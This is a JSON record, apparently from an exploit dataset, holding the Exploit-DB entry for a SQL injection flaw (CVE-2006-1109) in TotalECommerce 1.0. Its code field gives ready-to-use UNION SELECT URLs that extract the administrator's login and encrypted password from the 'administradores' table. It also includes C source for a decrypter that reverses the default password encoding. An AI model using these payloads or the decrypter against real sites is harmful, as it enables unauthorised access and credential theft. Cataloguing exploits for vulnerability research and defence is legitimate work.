{
  "id": "1550",
  "title": "TotalECommerce 1.0 - &#039;index.asp?id&#039; SQL Injection",
  "cve": "CVE-2006-1109",
  "vuln_type": "sqli",
  "code": "Original advisory: http://www.nukedx.com/?viewdoc=18\r\nAdvisory by: nukedx\r\nFull PoC\r\nExplotation:\r\nGET -> http://[victim]/[dir]/index.asp?secao=[PageID]&id=[SQL]\r\nEXAMPLE 1 -> http://[victim]/[dir]/index.asp?secao=25&id=-1+UNION+select+senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha,senha+from+administradores\r\nEXAMPLE 2 -> http://[victim]/[dir]/index.asp?secao=25&id=-1+UNION+select+login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login,login+from+administradores\r\nwith example 1 remote attacker can get admin's encrypted password and with example 2 remote attacker can get admin's login name\r\n[PageID]: must be working page id you can get some from frontpage.\r\n<--Decrypter code-->\r\n<--Note: This decrypter just decrypts default data\r\nIf webmaster changed te_chave value in funcoes.asp\r\nthis decrypter wont decrypt data so you need to \r\nmake your own decrypter\r\n-->\r\n<--C Source-->\r\n/*********************************************\r\n*        TotalECommerce PWD Decrypter        *\r\n*        Coded by |SaMaN| for nukedx         *\r\n*          http://www.k9world.org            *\r\n*              IRC.K9World.Org               *\r\n*Advisory: http://www.nukedx.com/?viewdoc=18 *\r\n**********************************************/\r\n#include <stdio.h>\r\n#include <stdlib.h>\r\n#include <string.h>\r\n#include <ctype.h>\r\n\r\nint main()\r\n{\r\n  char buf[255];\r\n  char buf2[255];\r\n  char buf3[255];\r\n  char *texto;\r\n  char *vcrypt;   \r\n  int i,x,z,t = 0;\r\n  char saman;\r\n  texto = buf;\r\n  vcrypt = buf2;\r\n  printf(\"%s\", \"|=------------------------------------=|\\n\");\r\n  printf(\"%s\", \"   Coded by |SaMaN| @ IRC.K9World.Org\\n\");\r\n  printf(\"%s\", \"|=------------------------------------=|\\n\\n\");\r\n  printf(\"%s\", \"Enter crypted password: \");\r\n  scanf(\"%200s\", buf);\r\n  if (!texto)\r\n  vcrypt = \"\";\r\n\r\n  for (i = 0; i < strlen(texto); i++)\r\n  {\r\n    if ((vcrypt == \"\") || (i > strlen(texto)))\r\n    x = 1;\r\n    else \r\n    x = x + 1;\r\n    t = buf[i];\r\n    z = 255 - t;\r\n    saman = toascii(z);\r\n    snprintf(buf3, 250, \"%c\", saman);\r\n    strncat(buf2, buf3, 250);\r\n  }\r\n  printf(\"Result: %s\\n\", buf2);\r\n  return;\r\n}\r\n<--End of code-->\r\n<--Thanks |SaMaN| for decrypter-->\r\n\r\n// milw0rm.com [2006-03-04]",
  "url": "https://www.exploit-db.com/exploits/1550"
}